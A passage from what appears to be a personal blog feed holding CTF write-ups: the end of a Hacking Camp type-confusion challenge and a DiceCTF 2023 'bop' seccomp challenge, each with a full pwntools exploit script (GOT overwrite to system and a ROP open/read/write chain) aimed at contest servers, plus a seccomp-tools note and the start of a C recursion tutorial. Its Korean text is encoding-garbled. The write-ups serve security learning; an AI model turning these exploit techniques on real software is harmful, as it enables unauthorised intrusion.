<code>puts@got</code>Î•º <code>system</code> Ìï®ÏàòÎ°ú ÎçÆÏùÑ Ïàò ÏûàÍ≤†Îã§Í≥† ÏÉùÍ∞ÅÌñàÎã§. Î®ºÏ†Ä <code>overflow</code> Ìï®ÏàòÏóêÏÑú Ìîº Ïó∞ÏÇ∞Ïûê Îëê Í∞úÏóê <code>puts@got</code>Î•º 4Î∞îÏù¥Ìä∏Ïî© ÏûòÎùºÏÑú ÎÑ£Ïñ¥ÎÜìÍ≥† <code>Interger_cal</code> Ìï®ÏàòÏóêÏÑú <code>puts@got</code>ÏóêÎã§Í∞Ä Í∞íÏùÑ Ïì∏ Ïàò ÏûàÎã§. Ïù¥ Îïå Ï§ëÏöîÌïú Í≤ÉÏùÄ 4Î∞îÏù¥Ìä∏Ïî© Ïûò ÏûòÎùºÏÑú ÎÑ£Ïñ¥Ï§òÏïºÌïúÎã§Îäî Í≤ÉÏù¥Îã§. Í∑∏Îüº Ïù¥Ï†ú ÏâòÏùÑ ÌöçÎìùÌï† Ïàò ÏûàÎã§.</p><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./chall&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;3.38.2.179&#x27;</span>, <span class="number">40020</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = e.libc</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;0 / 0&#x27;</span>) <span class="comment"># nan</span></span><br><span class="line"></span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">4</span>)) <span class="comment"># float -&gt; int</span></span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>)) <span class="comment"># overflow</span></span><br><span class="line"></span><br><span class="line">        payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x100</span></span><br><span class="line">        payload += p64(e.got[<span class="string">&#x27;printf&#x27;</span>])</span><br><span class="line">        payload += p64(e.got[<span class="string">&#x27;printf&#x27;</span>]+<span class="number">4</span>)</span><br><span class="line">        p.send(payload)</span><br><span class="line"></span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">5</span>)) <span class="comment"># leak</span></span><br><span class="line"></span><br><span class="line">        p.recvuntil(<span class="string">&#x27;Num 1.&#x27;</span>)</span><br><span class="line">        got1 = <span class="built_in">int</span>(p.recvline(), <span class="number">10</span>)</span><br><span class="line">        info(<span class="built_in">hex</span>(got1))</span><br><span class="line">        p.recvuntil(<span class="string">&#x27;Num 2.&#x27;</span>)</span><br><span class="line">        got2 = <span class="built_in">int</span>(p.recvline(), <span class="number">10</span>) <span class="comment"># 7f??</span></span><br><span class="line">        info(<span class="built_in">hex</span>(got2))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> got1 &gt; <span class="number">0</span>:</span><br><span class="line">            leak = <span class="built_in">hex</span>(got2) + <span class="built_in">hex</span>(got1)[<span class="number">2</span>:]</span><br><span class="line">            info(<span class="string">&#x27;leak : &#x27;</span> +leak)</span><br><span class="line">            libc.address = <span class="built_in">int</span>(leak, <span class="number">16</span>) - libc.symbols[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">            info(<span class="string">&#x27;libc_base : &#x27;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">            p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>)) <span class="comment"># overflow</span></span><br><span class="line"></span><br><span class="line">            payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">            payload += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">            payload += <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">0x100</span>- <span class="built_in">len</span>(payload))</span><br><span class="line">            payload += p64(e.got[<span class="string">&#x27;puts&#x27;</span>])   <span class="comment"># [32]</span></span><br><span class="line">            payload += p64(e.got[<span class="string">&#x27;puts&#x27;</span>]+<span class="number">4</span>) <span class="comment"># [33] 7f?? =&gt; got2</span></span><br><span class="line">            </span><br><span class="line">            p.send(payload)</span><br><span class="line"></span><br><span class="line">            system_low = <span class="built_in">int</span>(<span class="built_in">hex</span>(libc.symbols[<span class="string">&#x27;system&#x27;</span>])[-<span class="number">8</span>:], <span class="number">16</span>)</span><br><span class="line">            p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>)) <span class="comment"># 1</span></span><br><span class="line">            payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">            payload += <span class="built_in">str</span>(system_low)</span><br><span class="line">            payload += <span class="string">&#x27;+&#x27;</span></span><br><span class="line">            payload += <span class="built_in">str</span>(got2)</span><br><span class="line">            pause()</span><br><span class="line">            p.send(payload)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> NotImplementedError</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> es:</span><br><span class="line">        <span class="built_in">print</span>(es)</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="comment"># p = process(&#x27;./chall&#x27;)</span></span><br><span class="line">        p = remote(<span class="string">&#x27;3.38.2.179&#x27;</span>, <span class="number">40020</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HCAMP&#123;FUNNY_TYPECONFUSION&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> HCAMP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hacking Camp </tag>
            
            <tag> Type Confusion </tag>
            
            <tag> 1-day </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dice CTF 2023 - bop (seccomp)</title>
      <link href="/230207-dicectf2023-bop/"/>
      <url>/230207-dicectf2023-bop/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1838">https://ctftime.org/event/1838</a></li></ul><blockquote><p><code>nc mc.ax 30284</code></p></blockquote><ul><li>[159 solves &#x2F; 117 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">FROM pwn.red/jail:0.3.1</span><br><span class="line"></span><br><span class="line">COPY --from=ubuntu@sha256:bffb6799d706144f263f4b91e1226745ffb5643ea0ea89c2f709208e8d70c999 / /srv</span><br><span class="line">COPY flag.txt /srv/app/</span><br><span class="line">COPY bop /srv/app/run</span><br></pre></td></tr></table></figure><p>I patched the binary first before solve this binary.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x3fe000)</span><br></pre></td></tr></table></figure><p>We can see the function related with <code>seccomp</code> when open the binary with IDA. So we can use the <code>seccomp-tools</code>.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x06 0xffffffff  if (A != 0xffffffff) goto 0011</span><br><span class="line"> 0005: 0x15 0x04 0x00 0x00000000  if (A == read) goto 0010</span><br><span class="line"> 0006: 0x15 0x03 0x00 0x00000001  if (A == write) goto 0010</span><br><span class="line"> 0007: 0x15 0x02 0x00 0x00000002  if (A == open) goto 0010</span><br><span class="line"> 0008: 0x15 0x01 0x00 0x0000003c  if (A == exit) goto 0010</span><br><span class="line"> 0009: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0011</span><br><span class="line"> 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0011: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure><p>Only <code>open</code>, <code>read</code>, and <code>write</code> are available. But libc‚Äôs <code>open</code> function actually uses <code>openat</code> syscall. So We can‚Äôt use that function. We have to use the <code>open</code> syscall.</p><p>I use the <code>ropper</code> to find the <code>syscall ; ret</code> gadget.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><ul><li>flag.txt open, read and write</li></ul><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./bop&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;mc.ax&#x27;</span> ,<span class="number">30284</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./bop&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">main = <span class="number">0x4012F9</span></span><br><span class="line">pop_rdi = <span class="number">0x4013d3</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x4013d1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ropper -f libc.so.6 --nocolor &gt; rop.txt</span></span><br><span class="line">pop_rdx = <span class="number">0x142c92</span> <span class="comment"># libc </span></span><br><span class="line">syscall_ret = <span class="number">0x630a9</span> <span class="comment"># libc</span></span><br><span class="line">pop_rax = <span class="number">0x36174</span> <span class="comment"># libc</span></span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x20</span>+<span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(e.got[<span class="string">&#x27;printf&#x27;</span>])</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(e.sym[<span class="string">&#x27;printf&#x27;</span>])</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(main) <span class="comment"># main</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;bop?&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">libc.address = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">info(<span class="string">&#x27;libc base : &#x27;</span> + <span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x20</span>+<span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># read(0, bss, 8) flag.txt</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rsi_r15)</span><br><span class="line">payload += p64(<span class="number">0x4040A0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdx + libc.address)</span><br><span class="line">payload += p64(<span class="number">11</span>)</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(libc.sym[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># open(./flag.txt) syscall</span></span><br><span class="line">payload += p64(pop_rax + libc.address)</span><br><span class="line">payload += p64(<span class="number">2</span>) <span class="comment"># open</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">0x4040A0</span>)</span><br><span class="line">payload += p64(pop_rsi_r15)</span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(syscall_ret + libc.address)</span><br><span class="line"></span><br><span class="line"><span class="comment"># read(fd, bss, 100)</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">3</span>)</span><br><span class="line">payload += p64(pop_rsi_r15)</span><br><span class="line">payload += p64(<span class="number">0x4040A0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdx + libc.address)</span><br><span class="line">payload += p64(<span class="number">100</span>)</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(libc.sym[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># write(1, bss, 100)</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rsi_r15)</span><br><span class="line">payload += p64(<span class="number">0x4040A0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdx + libc.address)</span><br><span class="line">payload += p64(<span class="number">100</span>)</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(libc.sym[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;bop?&#x27;</span>, payload)</span><br><span class="line">p.send(<span class="string">&#x27;./flag.txt\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dice&#123;ba_da_ba_da_ba_be_bop_bop_bodda_bope_f8a01d8ec4e2&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Dice </category>
          
      </categories>
      
      
        <tags>
            
            <tag> seccomp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwnable - seccomp</title>
      <link href="/230206-pwn-seccomp/"/>
      <url>/230206-pwn-seccomp/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://github.com/dr0gba/seccomp-tools">https://github.com/dr0gba/seccomp-tools</a></li></ul><h2 id="install"><a href="#install" class="headerlink" title="install"></a>install</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gem install seccomp-tools</span><br></pre></td></tr></table></figure><h2 id="use"><a href="#use" class="headerlink" title="use"></a>use</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">seccomp-tools dump [chall]</span><br></pre></td></tr></table></figure><ul><li>result</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x06 0xffffffff  if (A != 0xffffffff) goto 0011</span><br><span class="line"> 0005: 0x15 0x04 0x00 0x00000000  if (A == read) goto 0010</span><br><span class="line"> 0006: 0x15 0x03 0x00 0x00000001  if (A == write) goto 0010</span><br><span class="line"> 0007: 0x15 0x02 0x00 0x00000002  if (A == open) goto 0010</span><br><span class="line"> 0008: 0x15 0x01 0x00 0x0000003c  if (A == exit) goto 0010</span><br><span class="line"> 0009: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0011</span><br><span class="line"> 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0011: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure><p>Related Challenge</p><ul><li><a href="https://jiravvit.github.io/221005-d-ctf2022-destruction/">https://jiravvit.github.io/221005-d-ctf2022-destruction/</a></li><li><a href="https://jiravvit.github.io/230207-dicectf2023-bop/">https://jiravvit.github.io/230207-dicectf2023-bop/</a></li></ul><h2 id="etc"><a href="#etc" class="headerlink" title="etc"></a>etc</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">WARNING:  You don&#x27;t have /home/jir4vvit/.local/share/gem/ruby/3.0.0/bin in your PATH,</span><br><span class="line">          gem executables will not run.</span><br></pre></td></tr></table></figure><p>If you get warning as above when you use the <code>gem</code>, you execute the command below.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> GEM_HOME=<span class="string">&quot;<span class="subst">$(ruby -e &#x27;puts Gem.user_dir&#x27;)</span>&quot;</span> </span><br><span class="line"><span class="built_in">export</span> PATH=<span class="string">&quot;<span class="variable">$PATH</span>:<span class="variable">$GEM_HOME</span>/bin&quot;</span></span><br><span class="line">gem list</span><br><span class="line">gem update</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Docs </category>
          
          <category> Pwnable </category>
          
      </categories>
      
      
        <tags>
            
            <tag> seccomp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Algorithm - Recursion, DFS, Backtracking (Baekjoon 15649, 15650, 15651, 15652 C)</title>
      <link href="/230202-algorithm-dfs_backtracking/"/>
      <url>/230202-algorithm-dfs_backtracking/</url>
      
        <content type="html"><![CDATA[<h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h2><ul><li><a href="https://solved.ac/en/profile/cutieee">https://solved.ac/en/profile/cutieee</a></li></ul><p>ÏöîÏ¶ò CÎ°ú Î∞±Ï§ÄÏùÑ Íæ∏Ï§ÄÌûà ÌíÄÍ≥† ÏûàÎã§. Ïù¥ Í∏ÄÏùÑ ÏãúÏ†êÏúºÎ°ú Streak 54 daysÎ•º Îã¨ÏÑ±ÌñàÎã§. ÏßùÏßùÏßù! Ïñ¥Ï†úÏØ§ Ïã§Î≤Ñ 2Î•º Îã¨ÏÑ±ÌñàÎäîÎç∞ ÏöîÏ¶ò Îì§Ïñ¥ ÏïåÍ≥†Î¶¨Ï¶òÏùÑ Îî∞Î°ú Í≥µÎ∂ÄÌï¥ÏïºÌï† ÌïÑÏöîÏÑ±ÏùÑ ÎäêÎÇÄÎã§. Í∑∏ÎÉ• ÌíÄÍ≤å ÎêòÎ©¥ ÏãúÍ∞Ñ Ï¥àÍ≥ºÍ∞Ä ÎÇòÍ∏∞ ÏùºÏàò. ÌòπÏùÄ Î¨∏Ï†ú ÌíÄÏù¥ Î∞©Ìñ•ÏÑ±ÏùÑ Ïû°Í∏∞Í∞Ä ÌûòÎì§Îã§.</p><p>Î∞±Ï§Ä 15649, 15650, 15651, 15652 Î¨∏Ï†úÎ•º ÌíÄÎ©¥ÏÑú Ïû¨Í∑Ä, DFS, Î∞±Ìä∏ÎûòÌÇπ Í∞úÎÖêÏùÑ Îã§Ïßà Ïàò ÏûàÏóàÎã§. Î∞±Ï§Ä ÏÇ¨Ïù¥Ìä∏ÏóêÏÑú <a href="https://www.acmicpc.net/step/34">Îã®Í≥ÑÎ≥ÑÎ°ú ÌíÄÏñ¥Î≥¥Í∏∞</a>ÏóêÏÑú Î∞±Ìä∏ÎûòÌÇπ ÏûÖÎ¨∏ Î¨∏Ï†úÎ•º Ïä§Ïä§Î°ú ÌíÄÏù¥ÌïòÏòÄÎã§. Î¨∏Ï†úÎ•º ÌíÄÏù¥ÌïòÎ©¥ÏÑú ÏñªÏùÄ ÏßÄÏãùÏùÑ Î∏îÎ°úÍ∑∏Ïóê Ï†ïÎ¶¨Ìï¥ÎÜìÏúºÎ†§Í≥† ÌïúÎã§.</p><p>Ïù¥ Í∏ÄÏùò Î™©ÌëúÎäî Î∞±Ìä∏ÎûòÌÇπÏùÑ Ïù¥Ìï¥ÌïòÍ≥† Î∞±Ï§Ä 15649, 15650, 15651, 15652 Î¨∏Ï†úÎ•º Ìë∏Îäî Í≤ÉÏù¥Îã§.</p><h2 id="Recursion-Ïû¨Í∑Ä"><a href="#Recursion-Ïû¨Í∑Ä" class="headerlink" title="Recursion Ïû¨Í∑Ä"></a>Recursion Ïû¨Í∑Ä</h2><p>Ïû¨Í∑Ä Ìï®ÏàòÎ•º ÏïÑÎûòÏôÄ Í∞ôÏù¥ ÌëúÌòÑÌï† Ïàò ÏûàÎã§.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">func</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">5</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, n);</span><br><span class="line">    <span class="keyword">return</span> func(n+<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    func(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>output</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td></tr></table></figure><p><code>func</code> Ìï®ÏàòÎäî n+1ÏùÑ Ïù∏ÏûêÎ°ú ÏûêÍ∏∞ ÏûêÏã†ÏùÑ Îã§Ïãú Ìò∏Ï∂úÌïúÎã§. nÏù¥ 5Ïùº Îïå Ï∂úÎ†•ÌïòÏßÄ ÏïäÍ≥† Ï¢ÖÎ£åÌïúÎã§. </p><p>Ïû¨Í∑Ä Ìï®ÏàòÎäî Ï£ºÎ°ú Í∞ÄÎèÖÏÑ±ÏùÑ ÏúÑÌï¥ Ïì∞Ïó¨ÏßÑÎã§. (Ïù¥Î°†Ï†ÅÏúºÎ°ú Ïû¨Í∑ÄÌï®ÏàòÎäî forÎ¨∏Í≥º whileÎ¨∏ Îì±ÏúºÎ°ú ÌëúÌòÑÌï† Ïàò ÏûàÎã§.) Ïû¨Í∑Ä Ìï®ÏàòÏóê ÎåÄÌïú Ïù¥Ìï¥Í∞Ä Ïñ¥Î†§Ïö¥ Ïù¥Ïú†Îäî Ïû¨Í∑Ä Ìï®ÏàòÎ•º ÏùºÎ∞ò Ìï®ÏàòÏôÄ Îã§Î•¥Í≤å ÏÉùÍ∞ÅÌïòÍ∏∞ ÎïåÎ¨∏Ïù¥Îã§. ÏÇ¨Ïã§ ÌùîÌûà ÏïÑÎäî ÏùºÎ∞ò Ìï®ÏàòÏôÄ Í∞ôÎã§Í≥† 